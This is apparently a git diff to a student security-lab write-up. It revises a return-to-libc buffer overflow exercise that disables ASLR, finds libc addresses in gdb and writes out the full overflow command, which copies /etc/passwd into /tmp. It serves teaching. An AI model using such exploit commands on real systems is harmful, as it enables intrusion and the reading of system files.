@@ -122,7 +122,7 @@ Turn off OS's address space layout randomization
 sudo sysctl -w kernel.randomize_va_space=0
 ```
 
-#### 2. Run gdb and find necessary addresses
+#### 2. Load program into gdb and find necessary addresses
 
 Run the env.out
 
@@ -148,35 +148,43 @@ Here's the result:
 
 <img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/7d75e56e9344244e6cea9989841ee95f6f4dbb36/images/task1/getAddress.jpg"><br>
 
-Address of system(): 0xf7e50db0
-
-Address of exit(): 0xf7e449e0
-
-To find address of task1, I quit the gdb and run this command:
-
-```
-objdump -d task1
-```
-
-Here's the result:
-
-<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/3a30229f26831b4a06f5cef45e2ba8ade49aa0fb/images/task1/task1.jpg"><br>
-
-Observing the result, the address of task1 is: 0x08048060
+Observing the results:
+* Address of system(): 0xf7e50db0
+* Address of exit(): 0xf7e449e0
+* Address of VULNP: 0xffffdf04x
 
 #### 3. Conduct the attack
 
-Here's the attack command:
+Note that we need to overflow the addresses in little-endian format. The most important thing is that we can only run this command while loading the program in gdb, as the address of VULNP will be different outside of it.
+
+Here’s the attack command:
 
 ```
-./task1.out $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x60\x80\x04\x08')")
+run $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x04\xdf\xff\xff')")
 ```
 
 The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses we expect.
 
-After running command, I got error: sh: 1: T ‼: not found
+After running command, here's the result:
 
-**Conclusion**: Task failed
+<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/e65982fbe770327e1d679d0c11722709e044e243/images/task1/result.jpg"><br>
+
+As we can clearly see, a file named outfile is created in /tmp/ as expected.
+
+Inspect outfile using this command (when still in the /tmp/ folder):
+
+```
+cat outfile
+```
+Result:
+
+<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/2562028aa8e07a5365f2f3d537dda862ca804e06/images/task1/catResult.jpg"><br>
+
+The content of /etc/passwd is copied to this file.
+
+To check 
+
+**Conclusion**: Task successfully.
 
 # Task 2: Attack on database of DVWA
 - Install dvwa (on host machine or docker container)
